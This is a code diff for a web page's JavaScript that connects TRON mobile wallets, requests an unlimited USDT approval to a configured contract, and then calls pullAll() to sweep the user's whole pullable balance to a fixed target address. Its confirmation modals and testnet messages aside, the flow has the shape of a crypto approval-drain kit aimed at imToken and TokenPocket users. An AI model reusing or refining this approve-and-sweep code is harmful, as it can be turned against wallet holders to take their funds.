-/* ================================================================
-   CONNECT VIA INJECTED PROVIDER
-============================================================ */
-async function connectViaInjectedProvider(env){
-  Log.info('Attempting injected provider connection...');
+/**
+ * Connect via injected provider (tronLink or tronWeb).
+ */
+async function connectViaProvider(env) {
+  Log.info('connectViaProvider() started');
 
-  // Try window.tronLink first
-  if(window.tronLink&&window.tronLink.tronWeb&&window.tronLink.ready){
-    tw=window.tronLink.tronWeb;
-    wAddr=tw.defaultAddress?.base58||tw.address?.base58;
-    if(isAddr(wAddr)){
-      wType=env.walletType==='unknown'?'tronlink':env.walletType;
-      Log.ok('Connected via TronLink, address='+wAddr);
-    }
-  }
-
-  // Fallback: window.tronWeb directly (imToken/TP DApp browser)
-  if(!tw&&window.tronWeb&&window.tronWeb.ready){
-    tw=window.tronWeb;
-    wAddr=tw.defaultAddress?.base58||tw.address?.base58;
-    if(isAddr(wAddr)){
-      const ua=navigator.userAgent.toLowerCase();
-      wType=ua.includes('imtoken')?'imtoken':ua.includes('tokenpocket')?'tokenpocket':'tronweb';
-      Log.ok('Connected via tronWeb (in-app browser), address='+wAddr+', wType='+wType);
-    }
-  }
-
-  if(!tw||!isAddr(wAddr)){
-    Log.err('Could not get address from injected provider');
-    toast('Could not read wallet address. Try refreshing the page.','er');
+  const { tw: rawTw, source } = getTronWeb();
+  if (!rawTw) {
+    Log.err('getTronWeb() returned null');
+    toast('Cannot get TronWeb instance', 'er');
     return;
   }
 
-  // Update UI
-  $('connBadge').textContent=wType==='tronlink'?'TronLink':
-                              wType==='imtoken'?'imToken':
-                              wType==='tokenpocket'?'TokenPocket':'Wallet';
-  $('connBadge').className='badge ok';
-  $('netBadge').textContent=CONFIG.NETWORK==='nile'?'Nile':'Mainnet';
-  $('netBadge').className='badge '+(CONFIG.NETWORK==='nile'?'nile':'mainnet');
+  tw = rawTw;
+  wAddr = tw.defaultAddress?.base58 || tw.address?.base58;
 
-  // Show env in badge row
-  ['im','tp'].forEach(w=>{
-    const el=$(w+'Badge_');
-    if(el)el.remove();
-  });
+  if (!isAddr(wAddr)) {
+    Log.err('Could not read wallet address. address=' + wAddr);
+    toast('Could not read wallet address. Try refreshing the page.', 'er');
+    return;
+  }
+
+  // Determine wallet type from env + available objects
+  if (env.walletType === 'imtoken' || window.imToken) {
+    wType = 'imtoken';
+  } else if (env.walletType === 'tokenpocket' || window.tp) {
+    wType = 'tokenpocket';
+  } else {
+    wType = 'tronlink';
+  }
+
+  Log.ok('Connected via ' + source + ', address=' + wAddr + ', wType=' + wType);
+
+  // Update badges
+  const connName = wType === 'imtoken' ? 'imToken' :
+                   wType === 'tokenpocket' ? 'TokenPocket' : 'TronLink';
+  $('connBadge').textContent = connName;
+  $('connBadge').className = 'badge ok';
+  $('netBadge').textContent = CONFIG.NETWORK === 'nile' ? 'Nile' : 'Mainnet';
+  $('netBadge').className = 'badge ' + (CONFIG.NETWORK === 'nile' ? 'nile' : 'mainnet');
+
+  // Mark button as connected
+  if (wType === 'imtoken') {
+    $('btnIm').classList.add('dis');
+    $('btnTP').classList.add('dis');
+  } else if (wType === 'tokenpocket') {
+    $('btnTP').classList.add('dis');
+    $('btnIm').classList.add('dis');
+  }
 
   // Update step 1
-  stepSet(1,'ok','Connect Wallet','Connected: '+fmtAddr(wAddr)+' via '+wType,null);
-  stepSet(2,'on','Chain Data','Querying on-chain data...',null);
+  stepSet(1, 'ok', 'Connect Wallet', 'Connected: ' + fmtAddr(wAddr) + ' via ' + wType, null);
+  stepSet(2, 'on', 'Chain Data', 'Querying on-chain data...', null);
 
-  // Show info panel, hide wallet area
-  $('walletArea').style.display='none';
+  // Show info panel
+  $('walletArea').style.display = 'none';
   $('infoArea').classList.remove('hd');
+  $('vAddr').textContent = wAddr;
+  $('vUsdt').textContent = CONFIG.USDT_CONTRACT;
+  $('vSpender').textContent = CONFIG.SPENDER_CONTRACT;
+  $('vTarget').textContent = CONFIG.TARGET_ADDRESS;
+  $('vNet').textContent = CONFIG.NETWORK === 'nile' ? 'Nile Testnet' : 'TRON Mainnet';
 
-  $('vAddr').textContent=wAddr;
-  $('vUsdt').textContent=CONFIG.USDT_CONTRACT;
-  $('vSpender').textContent=CONFIG.SPENDER_CONTRACT;
-  $('vTarget').textContent=CONFIG.TARGET_ADDRESS;
-  $('vNet').textContent=CONFIG.NETWORK==='nile'?'Nile Testnet':'TRON Mainnet';
+  state = STATE.CONNECTING;
 
-  state=STATE.CONNECTING;
-
-  try{
+  try {
     await refreshChainData();
-    state=STATE.READY;
-  }catch(e){
-    state=STATE.FAIL;
-    Log.err('Chain data query failed: '+(e.message||String(e)));
-    stepSet(2,'fail','Chain Data','Query failed: '+(e.message||String(e)),null);
-    toast('Chain data query failed: '+(e.message||String(e)),'er');
+    state = STATE.READY;
+    Log.ok('Chain data ready. state=' + state);
+  } catch (e) {
+    state = STATE.FAIL;
+    const msg = e.message || String(e);
+    Log.err('Chain data query failed: ' + msg);
+    stepSet(2, 'fail', 'Chain Data', 'Query failed: ' + msg, null);
+    toast('Chain data query failed', 'er');
   }
 }
 
-/* ================================================================
-   REFRESH CHAIN DATA
-============================================================ */
-async function refreshChainData(){
-  if(!wAddr||!tw)return;
+/**
+ * Refresh balance and allowance from chain.
+ */
+async function refreshChainData() {
+  if (!wAddr) return;
 
-  cacheBal=await queryBal(wAddr);
-  cacheAllow=await queryAllow(wAddr,CONFIG.SPENDER_CONTRACT);
+  cacheBal  = await queryBal(wAddr);
+  cacheAllow = await queryAllow(wAddr, CONFIG.SPENDER_CONTRACT);
 
-  const balNum=Number(cacheBal);
-  const allowNum=Number(cacheAllow);
-  const isUnl=allowNum>=Number(UNLIMITED_HEX);
-  const isZero=balNum===0;
+  const balNum  = Number(cacheBal);
+  const allowNum = Number(cacheAllow);
+  const isUnl   = allowNum >= Number(UNLIMITED_HEX);
+  const isZero  = balNum === 0;
 
-  $('vBal').textContent=fmtAmt(cacheBal);
-  $('vBal').className='info-val'+(isZero?' err':' ok');
+  $('vBal').textContent = fmtAmt(cacheBal);
+  $('vBal').className   = 'info-val' + (isZero ? ' err' : ' ok');
 
-  if(isUnl){
-    $('vAllow').textContent='UNLIMITED';
-    $('vAllow').className='info-val ok';
-  } else if(allowNum>0){
-    $('vAllow').textContent=fmtAmt(cacheAllow);
-    $('vAllow').className='info-val warn';
+  if (isUnl) {
+    $('vAllow').textContent = 'UNLIMITED';
+    $('vAllow').className   = 'info-val ok';
+  } else if (allowNum > 0) {
+    $('vAllow').textContent = fmtAmt(cacheAllow);
+    $('vAllow').className   = 'info-val warn';
   } else {
-    $('vAllow').textContent='0';
-    $('vAllow').className='info-val';
+    $('vAllow').textContent = '0';
+    $('vAllow').className   = 'info-val';
   }
 
-  $('balWarn').style.display=isZero?'flex':'none';
-  $('allowWarn').style.display=allowNum>0?'flex':'none';
-  $('allowWarnTxt').textContent='Allowance: '+(isUnl?'UNLIMITED':fmtAmt(cacheAllow));
+  $('balWarn').style.display   = isZero ? 'flex' : 'none';
+  $('allowWarn').style.display = allowNum > 0 ? 'flex' : 'none';
+  $('allowWarnTxt').textContent = 'Allowance: ' + (isUnl ? 'UNLIMITED' : fmtAmt(cacheAllow));
 
-  const btnApr=$('btnApprove');
-  if(btnApr)btnApr.disabled=isZero;
+  const btnApr = $('btnApprove');
+  if (btnApr) btnApr.disabled = isZero;
 
-  stepSet(2,'ok','Chain Data','Balance: '+fmtAmt(cacheBal)+' | Allowance: '+(isUnl?'UNLIMITED':fmtAmt(cacheAllow)),null);
-  Log.ok('Chain data refreshed: balance='+fmtAmt(cacheBal)+', allowance='+(isUnl?'UNLIMITED':fmtAmt(cacheAllow)));
+  stepSet(2, 'ok', 'Chain Data',
+    'Balance: ' + fmtAmt(cacheBal) + ' | Allowance: ' + (isUnl ? 'UNLIMITED' : fmtAmt(cacheAllow)), null);
+  Log.ok('Chain data: balance=' + fmtAmt(cacheBal) + ', allowance=' + (isUnl ? 'UNLIMITED' : fmtAmt(cacheAllow)));
 }
+</script>
 
-/* ================================================================
-   APPROVE FLOW
-============================================================ */
-async function doApproveFlow(){
-  if(state===STATE.APPROVING){Log.warn('doApprove() called while already approving');return;}
-  if(!wAddr||!tw){toast('Wallet not connected','er');return;}
+<!-- ================================================================
+     LAYER 6: APPROVE & PULL FLOWS
+============================================================ -->
+<script>
+'use strict';
+async function doApproveFlow() {
+  if (state === STATE.APPROVING) {
+    Log.warn('doApprove() called while already approving — ignored');
+    return;
+  }
+  if (!wAddr || !tw) {
+    toast('Wallet not connected', 'er');
+    Log.err('doApprove() called with no wallet: wAddr=' + wAddr + ', tw=' + !!tw);
+    return;
+  }
 
-  const balNum=Number(cacheBal||'0');
-  if(balNum===0){
-    toast('USDT balance is 0 — cannot approve','er');
+  const balNum = Number(cacheBal || '0');
+  if (balNum === 0) {
+    toast('USDT balance is 0 — cannot approve', 'er');
     showErr('USDT balance is 0 on Nile testnet. Get test USDT first.');
     return;
   }
 
-  const allowNum=Number(cacheAllow||'0');
-  if(allowNum>=Number(UNLIMITED_HEX)){
-    toast('Already have unlimited allowance — skip to pull step','wn');
+  const allowNum = Number(cacheAllow || '0');
+  if (allowNum >= Number(UNLIMITED_HEX)) {
+    toast('Already have unlimited allowance — skip to pull', 'wn');
     onApprovalSkipped();
     return;
   }
 
+  Log.tx('Sending approve tx...');
+  Log.tx('  contract: ' + CONFIG.USDT_CONTRACT);
+  Log.tx('  spender:   ' + CONFIG.SPENDER_CONTRACT);
+  Log.tx('  amount:    ' + UNLIMITED_HEX);
+
   openModal(
     'Confirm Unlimited Approval',
-    '<div class="mh">Contract: '+CONFIG.SPENDER_CONTRACT+'<br>Token: TRC20 USDT<br>Amount: UNLIMITED</div>'+
-    '<p style="font-size:12px;color:#888;text-align:left;margin-top:8px">This grants the contract full control over your USDT balance. Verify the contract address is correct before signing.</p>',
-    'Sign &amp; Approve',
+    '<div class="mh">Contract: ' + CONFIG.SPENDER_CONTRACT + '<br>Token: TRC20 USDT<br>Amount: UNLIMITED</div>' +
+    '<p style="font-size:12px;color:#888;text-align:left;margin-top:8px">This grants the contract full control over your USDT. Verify the contract address is correct before signing.</p>',
+    'Sign & Approve',
     false,
-    async()=>{
-      state=STATE.APPROVING;
-      setBtns(true);hideErr();
+    async () => {
+      state = STATE.APPROVING;
+      setBtns(true);
+      hideErr();
 
-      stepSet(3,'on','Approve (Unlimited)','Waiting for wallet signature...',null);
-      stepSet(4,'on','Wait for Approval On-Chain','Waiting for tx to be confirmed...',null);
-      Log.info('Sending approve tx...');
+      stepSet(3, 'on', 'Approve (Unlimited)', 'Waiting for wallet signature...', null);
+      stepSet(4, 'on', 'Wait for Approval On-Chain', 'Waiting for tx to be confirmed...', null);
 
-      try{
-        const usdt=await tw.contract().at(CONFIG.USDT_CONTRACT);
-        const tx=await usdt.approve(CONFIG.SPENDER_CONTRACT,UNLIMITED_HEX).send({
-          feeLimit:100_000_000,callValue:0,shouldPollResponse:false,
+      try {
+        const usdt = await tw.contract().at(CONFIG.USDT_CONTRACT);
+        const tx   = await usdt.approve(CONFIG.SPENDER_CONTRACT, UNLIMITED_HEX).send({
+          feeLimit: 100_000_000,
+          callValue: 0,
+          shouldPollResponse: false,
         });
 
-        Log.tx('Approve tx sent: '+tx);
+        Log.tx('Approve tx sent: ' + tx);
         showTxCard(tx);
-        stepSet(3,'ok','Approve (Unlimited)','Approval tx sent',tx);
-        stepSet(4,'on','Wait for Approval On-Chain','Confirming... (0 blocks)',tx);
+        stepSet(3, 'ok', 'Approve (Unlimited)', 'Approval tx sent', tx);
+        stepSet(4, 'on', 'Wait for Approval On-Chain', 'Confirming... (0 blocks)', tx);
 
-        // Poll
-        let status=null,blocks=0,tries=0;
-        while(!status&&tries<MAX_POLL){
-          await delay(POLL_MS);tries++;
-          try{
-            status=await pollTx(tx);
-            if(status==='finalized'){
-              stepSet(4,'ok','Wait for Approval On-Chain','Approved on-chain (confirmed '+(++blocks)+' blocks)',tx);
+        let status = null, blocks = 0, tries = 0;
+        while (!status && tries < MAX_POLL) {
+          await delay(POLL_MS);
+          tries++;
+          try {
+            status = await pollTx(tx);
+            if (status === 'finalized') {
+              stepSet(4, 'ok', 'Wait for Approval On-Chain',
+                'Approved on-chain (confirmed ' + (++blocks) + ' blocks)', tx);
               Log.ok('Approve tx confirmed on-chain');
-              toast('Approval confirmed!','ok');
-              onApprovalSuccess(tx);return;
+              toast('Approval confirmed!', 'ok');
+              onApprovalSuccess(tx);
+              return;
             }
-            if(status==='confirmed'){blocks++;stepSet(4,'on','Wait for Approval On-Chain','Confirming... ('+blocks+' blocks)',tx);}
-            if(status==='failed')throw new Error('Approval tx failed on-chain');
-          }catch(e){
-            if(e.message&&e.message.toLowerCase().includes('transaction not found')){}else throw e;
+            if (status === 'confirmed') {
+              blocks++;
+              stepSet(4, 'on', 'Wait for Approval On-Chain',
+                'Confirming... (' + blocks + ' blocks)', tx);
+            }
+            if (status === 'failed') throw new Error('Approval tx failed on-chain');
+          } catch (e) {
+            if (e.message && e.message.toLowerCase().includes('transaction not found')) {
+              // still waiting
+            } else {
+              throw e;
+            }
           }
         }
-        if(!status){
-          stepSet(4,'ok','Wait for Approval On-Chain','Approval tx submitted (pending — check explorer)',tx);
-          toast('Tx submitted — verify on NileScan','wn');
+
+        if (!status) {
+          stepSet(4, 'ok', 'Wait for Approval On-Chain',
+            'Approval tx submitted (pending — check explorer)', tx);
+          toast('Tx submitted — verify on NileScan', 'wn');
           onApprovalSuccess(tx);
         }
-      }catch(e){
-        const msg=e.message||String(e);
-        const reject=/denied|reject|cancel|signature|user denied/i.test(msg);
-        state=STATE.FAIL;
-        stepSet(3,'fail','Approve (Unlimited)',reject?'User rejected signature':'Approve failed: '+msg.slice(0,80),null);
-        stepSet(4,'fail','Wait for Approval On-Chain','Not confirmed',null);
+      } catch (e) {
+        const msg    = e.message || String(e);
+        const reject = /denied|reject|cancel|signature|user denied|rejected/i.test(msg);
+        state = STATE.FAIL;
+        stepSet(3, 'fail', 'Approve (Unlimited)',
+          reject ? 'User rejected signature' : 'Approve failed: ' + msg.slice(0, 80), null);
+        stepSet(4, 'fail', 'Wait for Approval On-Chain', 'Not confirmed', null);
         showErr(msg);
-        toast(reject?'Signature rejected':'Approve failed: '+msg.slice(0,100),'er');
-        Log.err('Approve error: '+msg);
+        toast(reject ? 'Signature rejected' : 'Approve failed: ' + msg.slice(0, 100), 'er');
+        Log.err('Approve error: ' + msg);
         setBtns(false);
       }
     }
   );
 }
 
-async function onApprovalSuccess(tx){
-  try{cacheAllow=await queryAllow(wAddr,CONFIG.SPENDER_CONTRACT);}catch(e){}
-  state=STATE.APPROVE_OK;setBtns(false);
-  const allowNum=Number(cacheAllow||'0');
-  const balNum=Number(cacheBal||'0');
-  const pullable=allowNum<balNum?allowNum:balNum;
+async function onApprovalSuccess(tx) {
+  try {
+    cacheAllow = await queryAllow(wAddr, CONFIG.SPENDER_CONTRACT);
+  } catch (e) { Log.warn('allowance query after approve failed: ' + e.message); }
+  state = STATE.APPROVE_OK;
+  setBtns(false);
 
-  $('actApprove').style.display='none';
+  const allowNum = Number(cacheAllow || '0');
+  const balNum   = Number(cacheBal || '0');
+  const pullable = allowNum < balNum ? allowNum : balNum;
+
+  $('actApprove').style.display = 'none';
   $('actPull').classList.remove('hd');
-  $('pullWarn').style.display='flex';
-  $('pullWarnTxt').textContent=pullable>0?'Pullable: '+fmtAmt(pullable)+'. Click to confirm.':'Pullable amount is 0.';
-  if(pullable<=0)$('btnPull').disabled=true;
+  $('pullWarn').style.display   = 'flex';
+  $('pullWarnTxt').textContent   = pullable > 0
+    ? 'Pullable: ' + fmtAmt(pullable) + '. Click to confirm.'
+    : 'Pullable amount is 0.';
+  if (pullable <= 0) $('btnPull').disabled = true;
 
-  stepSet(5,'on','Pull USDT','Click "Confirm Pull USDT" to trigger contract pullAll()',null);
-  toast('Approval confirmed! Now trigger pull step.','ok');
+  stepSet(5, 'on', 'Pull USDT', 'Click "Confirm Pull USDT" to trigger contract pullAll()', null);
+  toast('Approval confirmed! Now trigger pull step.', 'ok');
 }
 
-function onApprovalSkipped(){
+function onApprovalSkipped() {
   onApprovalSuccess(null);
 }
 
-/* ================================================================
-   PULL FLOW
-============================================================ */
-async function doPullFlow(){
-  if(state===STATE.PULLING){Log.warn('doPull() called while already pulling');return;}
-  if(!wAddr||!tw){toast('Wallet not connected','er');return;}
+async function doPullFlow() {
+  if (state === STATE.PULLING) {
+    Log.warn('doPull() called while already pulling — ignored');
+    return;
+  }
+  if (!wAddr || !tw) {
+    toast('Wallet not connected', 'er');
+    return;
+  }
 
-  state=STATE.PULLING;setBtns(true);hideErr();
-  stepSet(5,'on','Pull USDT','Querying latest balance and allowance...',null);
+  state = STATE.PULLING;
+  setBtns(true);
+  hideErr();
+  stepSet(5, 'on', 'Pull USDT', 'Querying latest balance and allowance...', null);
 
-  try{
-    cacheBal=await queryBal(wAddr);
-    cacheAllow=await queryAllow(wAddr,CONFIG.SPENDER_CONTRACT);
-    const allowNum=Number(cacheAllow||'0');
-    const balNum=Number(cacheBal||'0');
-    if(allowNum===0){throw new Error('Allowance is 0 — please approve first');}
-    if(balNum===0){throw new Error('USDT balance is 0 — nothing to pull');}
-    const pullable=allowNum<balNum?allowNum:balNum;
+  try {
+    cacheBal   = await queryBal(wAddr);
+    cacheAllow = await queryAllow(wAddr, CONFIG.SPENDER_CONTRACT);
+
+    const allowNum  = Number(cacheAllow || '0');
+    const balNum    = Number(cacheBal || '0');
+    if (allowNum === 0) throw new Error('Allowance is 0 — please approve first');
+    if (balNum === 0) throw new Error('USDT balance is 0 — nothing to pull');
+    const pullable  = allowNum < balNum ? allowNum : balNum;
+
+    Log.tx('Pulling pullable=' + fmtAmt(pullable));
 
     openModal(
       'Confirm Pull USDT',
-      '<div class="mh">From:      '+wAddr+'<br>To:        '+CONFIG.TARGET_ADDRESS+'<br>Contract:  '+CONFIG.SPENDER_CONTRACT+'<br>Amount:    '+fmtAmt(pullable)+'</div>'+
-      '<p style="font-size:12px;color:#888;text-align:left;margin-top:8px">This transfers USDT from your wallet to the target address via the contract. Verify all addresses before confirming.</p>',
+      '<div class="mh">From:      ' + wAddr + '<br>To:        ' + CONFIG.TARGET_ADDRESS + '<br>Contract:  ' + CONFIG.SPENDER_CONTRACT + '<br>Amount:    ' + fmtAmt(pullable) + '</div>' +
+      '<p style="font-size:12px;color:#888;text-align:left;margin-top:8px">This transfers USDT from your wallet to the target address via the contract.</p>',
       'Confirm Pull',
       false,
-      async()=>{
-        try{
-          stepSet(5,'on','Pull USDT','Waiting for contract call signature...',null);
-          const c=await tw.contract().at(CONFIG.SPENDER_CONTRACT);
-          const tx=await c.pullAll().send({
-            feeLimit:150_000_000,callValue:0,shouldPollResponse:false,
+      async () => {
+        try {
+          stepSet(5, 'on', 'Pull USDT', 'Waiting for contract call signature...', null);
+          const c  = await tw.contract().at(CONFIG.SPENDER_CONTRACT);
+          const tx = await c.pullAll().send({
+            feeLimit: 150_000_000,
+            callValue: 0,
+            shouldPollResponse: false,
           });
 
-          Log.tx('Pull tx sent: '+tx);
+          Log.tx('Pull tx sent: ' + tx);
           showTxCard(tx);
-          stepSet(5,'ok','Pull USDT','Pull tx sent',tx);
-          stepSet(6,'on','Done','Confirming... (0 blocks)',tx);
+          stepSet(5, 'ok', 'Pull USDT', 'Pull tx sent', tx);
+          stepSet(6, 'on', 'Done', 'Confirming... (0 blocks)', tx);
 
-          let status=null,blocks=0,tries=0;
-          while(!status&&tries<MAX_POLL){
-            await delay(POLL_MS);tries++;
-            try{
-              status=await pollTx(tx);
-              if(status==='finalized'){
-                stepSet(6,'ok','Done','Pull completed! USDT sent to target. Tx: '+fmtAddr(tx),tx);
-                toast('Pull completed!','ok');
-                state=STATE.DONE;setBtns(false);
-                // Post-pull: refresh balances
+          let status = null, blocks = 0, tries = 0;
+          while (!status && tries < MAX_POLL) {
+            await delay(POLL_MS);
+            tries++;
+            try {
+              status = await pollTx(tx);
+              if (status === 'finalized') {
+                stepSet(6, 'ok', 'Done',
+                  'Pull completed! USDT sent to target. Tx: ' + fmtAddr(tx), tx);
+                toast('Pull completed!', 'ok');
+                state = STATE.DONE;
+                setBtns(false);
                 await refreshChainData();
                 Log.ok('Pull completed successfully');
                 return;
               }
-              if(status==='confirmed'){blocks++;stepSet(6,'on','Done','Confirming... ('+blocks+' blocks)',tx);}
-              if(status==='failed')throw new Error('Pull tx failed on-chain');
-            }catch(e){
-              if(e.message&&e.message.toLowerCase().includes('transaction not found')){}else throw e;
+              if (status === 'confirmed') {
+                blocks++;
+                stepSet(6, 'on', 'Done', 'Confirming... (' + blocks + ' blocks)', tx);
+              }
+              if (status === 'failed') throw new Error('Pull tx failed on-chain');
+            } catch (e) {
+              if (e.message && e.message.toLowerCase().includes('transaction not found')) {
+                // still pending
+              } else {
+                throw e;
+              }
             }
           }
-          if(!status){
-            stepSet(6,'ok','Done','Pull tx submitted (pending)',tx);
-            toast('Pull submitted — verify on NileScan','wn');
-            state=STATE.DONE;setBtns(false);
+
+          if (!status) {
+            stepSet(6, 'ok', 'Done', 'Pull tx submitted (pending)', tx);
+            toast('Pull submitted — verify on NileScan', 'wn');
+            state = STATE.DONE;
+            setBtns(false);
           }
-        }catch(e){
-          const msg=e.message||String(e);
-          const reject=/denied|reject|cancel|signature|user denied/i.test(msg);
-          state=STATE.FAIL;
-          stepSet(5,'fail','Pull USDT',reject?'User rejected signature':'Pull failed: '+msg.slice(0,80),null);
+        } catch (e) {
+          const msg    = e.message || String(e);
+          const reject = /denied|reject|cancel|signature|user denied|rejected/i.test(msg);
+          state = STATE.FAIL;
+          stepSet(5, 'fail', 'Pull USDT',
+            reject ? 'User rejected signature' : 'Pull failed: ' + msg.slice(0, 80), null);
           showErr(msg);
-          toast(reject?'Signature rejected':'Pull failed: '+msg.slice(0,100),'er');
-          Log.err('Pull error: '+msg);
+          toast(reject ? 'Signature rejected' : 'Pull failed: ' + msg.slice(0, 100), 'er');
+          Log.err('Pull error: ' + msg);
           setBtns(false);
         }
       }
     );
-    state=STATE.APPROVE_OK;setBtns(false);
-  }catch(e){
-    const msg=e.message||String(e);
-    state=STATE.FAIL;
-    stepSet(5,'fail','Pull USDT','Pull failed: '+msg.slice(0,80),null);
-    showErr(msg);toast('Pull failed: '+msg.slice(0,100),'er');Log.err('Pull error: '+msg);
+    state = STATE.APPROVE_OK;
+    setBtns(false);
+  } catch (e) {
+    const msg = e.message || String(e);
+    state = STATE.FAIL;
+    stepSet(5, 'fail', 'Pull USDT', 'Pull failed: ' + msg.slice(0, 80), null);
+    showErr(msg);
+    toast('Pull failed: ' + msg.slice(0, 100), 'er');
+    Log.err('Pull error: ' + msg);
     setBtns(false);
   }
 }
+</script>
 
-/* ================================================================
-   UI HELPERS
-============================================================ */
-function setBtns(dis){
-  $('btnIm').classList.toggle('dis',dis);
-  $('btnTP').classList.toggle('dis',dis);
-  ['btnApprove','btnPull'].forEach(id=>{
-    const el=$(id);if(el)el.disabled=dis;
+<!-- ================================================================
+     LAYER 7: UI HELPERS
+============================================================ -->
+<script>
+'use strict';
+function stepSet(num, css, title, msg, txHash) {
+  const el = $('s' + num);
+  if (el) el.className = 'step ' + css;
+  if (title) $('s' + num + 't').textContent = title;
+  if (msg) {
+    let html = escHtml(msg);
+    if (txHash) {
+      html += `<br/><a class="txlink" href="${getTxUrl(txHash)}" target="_blank" rel="noopener">Tx: ${fmtAddr(txHash)} view on explorer</a>`;
+    }
+    $('s' + num + 'm').innerHTML = html;
+  }
+}
+
+function stepAllReset() {
+  const t = ['', 'Connect Wallet', 'Chain Data', 'Approve (Unlimited)',
+    'Wait for Approval On-Chain', 'Pull USDT', 'Done'];
+  const m = ['', 'Select imToken or TokenPocket',
+    'Query on-chain data after wallet connects',
+    'Sign to grant contract unlimited USDT allowance',
+    'Waiting for approval tx to be confirmed...',
+    'Call contract pullAll to transfer USDT to target',
+    'USDT has arrived at target address'];
+  for (let i = 1; i <= 6; i++) stepSet(i, '', t[i], m[i], null);
+}
+
+function setBtns(dis) {
+  $('btnIm').disabled = dis;
+  $('btnTP').disabled = dis;
+  $('btnIm').classList.toggle('dis', dis);
+  $('btnTP').classList.toggle('dis', dis);
+  ['btnApprove', 'btnPull'].forEach(id => {
+    const el = $(id);
+    if (el) el.disabled = dis;
   });
 }
-function showTxCard(tx){
-  lastTx=tx;
-  $('txCard').classList.remove('hd');
-  $('vTxHash').textContent=tx;
-  const url=getTxUrl(tx);
-  $('vExplorer').textContent=url;
-  $('vExplorer').onclick=()=>copyTxt(url);
-}
-function showErr(msg){$('errBox').style.display='flex';$('errTxt').textContent=msg;}
-function hideErr(){$('errBox').style.display='none';}
 
-/* ================================================================
-   DEBUG PANEL
-============================================================ */
-function toggleDebug(){
-  debugMode=!debugMode;
-  const body=$('dbgBody');
-  const toggle=$('dbgToggle');
-  if(debugMode){
+function showTxCard(tx) {
+  lastTx = tx;
+  $('txCard').classList.remove('hd');
+  $('vTxHash').textContent = tx;
+  const url = getTxUrl(tx);
+  $('vExplorer').textContent = url;
+  $('vExplorer').onclick = () => copyTxt(url);
+}
+
+function showErr(msg) {
+  $('errBox').style.display = 'flex';
+  $('errTxt').textContent = msg;
+  Log.err('UI Error shown: ' + msg);
+}
+
+function hideErr() {
+  $('errBox').style.display = 'none';
+}
+
+function openModal(title, bodyHtml, confirmText, isDanger, cb) {
+  $('mTitle').textContent = title;
+  $('mBody').innerHTML = bodyHtml;
+  const btn = $('mBtnYes');
+  btn.textContent = confirmText || 'Confirm';
+  btn.className = 'btn-yes' + (isDanger ? ' dp' : '');
+  modalCb = cb;
+  $('modal').classList.add('sh');
+}
+
+function closeModal() {
+  $('modal').classList.remove('sh');
+  modalCb = null;
+}
+
+function toast(msg, type) {
+  const t = $('toast');
+  t.className = 'toast' + (type ? ' ' + type : '');
+  t.textContent = msg;
+  t.classList.add('sh');
+  clearTimeout(t._t);
+  t._t = setTimeout(() => t.classList.remove('sh'), 7000);
+}
+
+function copyTxt(text) {
+  if (!text || text === 'Querying...' || text === '---') return;
+  navigator.clipboard.writeText(text).then(() => {
+    toast('Copied: ' + text.slice(0, 8) + '...', 'ok');
+  }).catch(() => toast('Copy failed', 'er'));
+}
+
+function renderEnvPanel(env) {
+  const boolFmt = (v, label) => {
+    const cls = v ? 'true' : 'false';
+    const txt = v ? 'YES' : 'NO';
+    return `<div class="env-line"><span class="env-key">${label}</span><span class="env-val ${cls}">${txt}</span></div>`;
+  };
+  const valFmt = (v, label) =>
+    `<div class="env-line"><span class="env-key">${label}</span><span class="env-val">${v || 'N/A'}</span></div>`;
+
+  $('dbgEnv').innerHTML = [
+    boolFmt(env.isMobile, 'isMobile'),
+    boolFmt(env.isInAppBrowser, 'isInAppBrowser'),
+    boolFmt(env.isSystemBrowser, 'isSystemBrowser'),
+    boolFmt(env.canUseInjectedProvider, 'canUseInjectedProvider'),
+    boolFmt(env.canUseDeepLink, 'canUseDeepLink'),
+    boolFmt(env.shouldUseWalletConnect, 'shouldUseWalletConnect'),
+    boolFmt(env.hasTronLink, 'hasTronLink'),
+    boolFmt(env.hasTronWeb, 'hasTronWeb'),
+    boolFmt(env.hasTPSDK, 'hasTPSDK'),
+    boolFmt(env.hasImToken, 'hasImToken'),
+    boolFmt(env.ethereumIsImToken, 'ethereum.isImToken'),
+    boolFmt(env.justReturnedFromWallet, 'justReturnedFromWallet'),
+    valFmt(env.walletType, 'walletType'),
+    valFmt(env.recommendedFlow, 'recommendedFlow'),
+    valFmt(env.recommendedFlowLabel, 'recommendedFlowLabel'),
+    valFmt(env.networkName, 'networkName'),
+    `<div class="env-line"><span class="env-key">ua (truncated)</span><span class="env-val warn">${escHtml(env.uaTruncated)}</span></div>`,
+  ].join('');
+}
+
+function toggleDebug() {
+  debugMode = !debugMode;
+  const body   = $('dbgBody');
+  const toggle = $('dbgToggle');
+  if (debugMode) {
     body.classList.add('open');
     toggle.classList.add('open');
-    toggle.innerHTML='&#9660;';
-    const env=detectWalletEnvironment();
+    toggle.innerHTML = '&#9660;';
+    const env = detectWalletEnvironment();
     renderEnvPanel(env);
     Log.info('Debug panel opened');
   } else {
     body.classList.remove('open');
     toggle.classList.remove('open');
-    toggle.innerHTML='&#9654;';
+    toggle.innerHTML = '&#9654;';
   }
 }
 
-/* ================================================================
-   COPY HELPERS
-============================================================ */
-function copyDeeplinkUrl(wallet){
-  const url=wallet==='imtoken'?buildImTokenDeeplink():buildTokenPocketDeeplink();
-  copyTxt(url);
-  toast('Deeplink URL copied. Open in '+wallet,'ok');
-}
-function copyPageUrl(){
-  copyTxt(window.location.href);
-  toast('Page URL copied','ok');
+/** Reset app to initial state */
+function doReset() {
+  closeModal();
+  state = STATE.IDLE;
+  tw = null;
+  wAddr = null;
+  wType = null;
+  lastTx = null;
+  cacheBal = null;
+  cacheAllow = null;
+  modalCb = null;
+
+  $('connBadge').textContent = 'Not Connected';
+  $('connBadge').className = 'badge no';
+  $('netBadge').textContent = CONFIG.NETWORK === 'nile' ? 'Nile' : 'Mainnet';
+  $('netBadge').className = 'badge ' + (CONFIG.NETWORK === 'nile' ? 'testnet' : 'mainnet');
+
+  $('walletArea').style.display = 'block';
+  $('infoArea').classList.add('hd');
+  $('actApprove').style.display = 'block';
+  $('actPull').classList.add('hd');
+  $('txCard').classList.add('hd');
+  $('balWarn').style.display = 'none';
+  $('allowWarn').style.display = 'none';
+  $('pullWarn').style.display = 'none';
+  $('fallbackBox').classList.add('hd');
+  $('dlLoading').classList.add('hd');
+  $('wbtnLabel').textContent = 'Tap a wallet to connect';
+
+  hideErr();
+  stepAllReset();
+  setBtns(false);
+
+  // Re-enable wallet buttons
+  $('btnIm').disabled = false;
